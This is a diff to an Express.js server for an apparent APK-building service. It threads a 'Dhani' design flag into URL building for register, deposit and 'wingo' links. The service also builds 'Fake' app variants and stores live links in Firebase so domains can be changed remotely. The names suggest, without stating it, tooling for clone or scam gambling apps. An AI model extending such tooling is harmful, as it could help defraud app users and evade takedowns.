@@ -190,6 +190,7 @@ app.post('/api/order', requireAuth, iconUpload.single('icon'), async (req, res) 
 
   const design = db.prepare('SELECT * FROM designs WHERE id=? AND active=1').get(design_id);
   if (!design) return res.json({ error: 'Design not found' });
+  const isDhaniDesign = design.category === 'dhani' || design.java_type === 'dhani' || design.java_type === 'premium';
 
   const user = db.prepare('SELECT * FROM users WHERE id=?').get(req.session.userId);
   if (!user) return res.status(401).json({ error: 'User not found. Please login again.' });
@@ -202,7 +203,7 @@ app.post('/api/order', requireAuth, iconUpload.single('icon'), async (req, res) 
   if (user.coins < totalCoins) return res.json({ error: `Not enough coins. Need ${totalCoins}, have ${user.coins}` });
 
   const { buildUrls, extractDomain } = require('./utils/htmlprocessor');
-  const { deposit: depositUrl, wingo: wingoUrl } = buildUrls(cleanRegisterUrl);
+  const { deposit: depositUrl, wingo: wingoUrl } = buildUrls(cleanRegisterUrl, isDhaniDesign);
   const domain = extractDomain(cleanRegisterUrl);
   const firebasePath = `zayro${domain.replace(/[^a-z0-9]/gi, '').substring(0, 10)}`;
   let fakeFirebasePath = null;
@@ -215,7 +216,7 @@ app.post('/api/order', requireAuth, iconUpload.single('icon'), async (req, res) 
     });
     if (fakeAddonEnabled && cleanFakeRegisterUrl) {
       const fakeDomain = extractDomain(cleanFakeRegisterUrl);
-      const fakeUrls = buildUrls(cleanFakeRegisterUrl);
+      const fakeUrls = buildUrls(cleanFakeRegisterUrl, isDhaniDesign);
       fakeFirebasePath = `zayrof${fakeDomain.replace(/[^a-z0-9]/gi,'').substring(0,8)}`;
       await updateFirebaseLinks(fakeFirebasePath, {
         registerUrl: cleanFakeRegisterUrl,
@@ -262,8 +263,8 @@ app.post('/api/order', requireAuth, iconUpload.single('icon'), async (req, res) 
           app_name: order.app_name + ' Fake',
           package_name: 'com.zayrof.' + packageName.split('.').pop(),
           register_url: cleanFakeRegisterUrl,
-          deposit_url: buildUrls(cleanFakeRegisterUrl).deposit,
-          wingo_url: buildUrls(cleanFakeRegisterUrl).wingo,
+          deposit_url: buildUrls(cleanFakeRegisterUrl, isDhaniDesign).deposit,
+          wingo_url: buildUrls(cleanFakeRegisterUrl, isDhaniDesign).wingo,
           domain: extractDomain(cleanFakeRegisterUrl),
           firebase_path: order.fake_firebase_path
             || `zayrof${extractDomain(cleanFakeRegisterUrl).replace(/[^a-z0-9]/gi,'').substring(0,8)}`
@@ -336,6 +337,12 @@ app.get('/api/orders/:id/download-fake', requireAuth, (req, res) => {
   res.download(apkPath, o.fake_apk_file);
 });
 
+function isDhaniOrder(order) {
+  return order.design_category === 'dhani'
+    || order.design_java_type === 'dhani'
+    || order.design_java_type === 'premium';
+}
+
 // Firebase live-link update. New APKs read URL fields from the same
 // <firebase_path>/config node that already controls deposit/register conditions,
 // so the APK never depends on this builder server while running.
@@ -343,7 +350,11 @@ app.post('/api/orders/:id/change-domain', requireAuth, async (req, res) => {
   if (!req.body.new_register_url) return res.json({ error: 'New URL required' });
 
   const changeType = req.body.change_type === 'invite' ? 'invite' : 'domain';
-  const order = db.prepare('SELECT * FROM orders WHERE id=? AND user_id=?').get(req.params.id, req.session.userId);
+  const order = db.prepare(`
+    SELECT o.*,d.category AS design_category,d.java_type AS design_java_type
+    FROM orders o JOIN designs d ON d.id=o.design_id
+    WHERE o.id=? AND o.user_id=?
+  `).get(req.params.id, req.session.userId);
   if (!order) return res.status(404).json({ error: 'Order not found' });
   if (order.status !== 'done') return res.json({ error: 'Order must be completed first' });
 
@@ -363,7 +374,7 @@ app.post('/api/orders/:id/change-domain', requireAuth, async (req, res) => {
   if (!user) return res.json({ error: 'User not found' });
 
   const { buildUrls, extractDomain } = require('./utils/htmlprocessor');
-  const { deposit: depositUrl, wingo: wingoUrl } = buildUrls(newRegisterUrl);
+  const { deposit: depositUrl, wingo: wingoUrl } = buildUrls(newRegisterUrl, isDhaniOrder(order));
   const domain = extractDomain(newRegisterUrl);
   const newLinks = { registerUrl: newRegisterUrl, depositUrl, wingoUrl };
   const oldLinks = {
@@ -944,7 +955,7 @@ function getOrderFirebaseTarget(order, variant = 'real') {
       variant: 'fake',
       firebasePath,
       registerUrl: order.fake_register_url,
-      urls: buildUrls(order.fake_register_url)
+      urls: buildUrls(order.fake_register_url, isDhaniOrder(order))
     };
   }
   return {
@@ -957,7 +968,8 @@ function getOrderFirebaseTarget(order, variant = 'real') {
 
 function getAdminOrder(orderId) {
   return db.prepare(`
-    SELECT o.*,u.username,d.name AS design_name
+    SELECT o.*,u.username,d.name AS design_name,
+      d.category AS design_category,d.java_type AS design_java_type
     FROM orders o JOIN users u ON u.id=o.user_id JOIN designs d ON d.id=o.design_id
     WHERE o.id=?
   `).get(orderId);
@@ -1010,7 +1022,7 @@ app.patch('/api/admin/orders/:id/firebase/link', requireAdmin, async (req, res) 
       ? replaceUrlDomain(target.registerUrl, req.body.new_register_url)
       : normalizeHttpUrl(req.body.new_register_url);
     const { buildUrls, extractDomain } = require('./utils/htmlprocessor');
-    const urls = buildUrls(registerUrl);
+    const urls = buildUrls(registerUrl, isDhaniOrder(order));
     await updateFirebaseLinks(target.firebasePath, {
       registerUrl,
       depositUrl: urls.deposit,
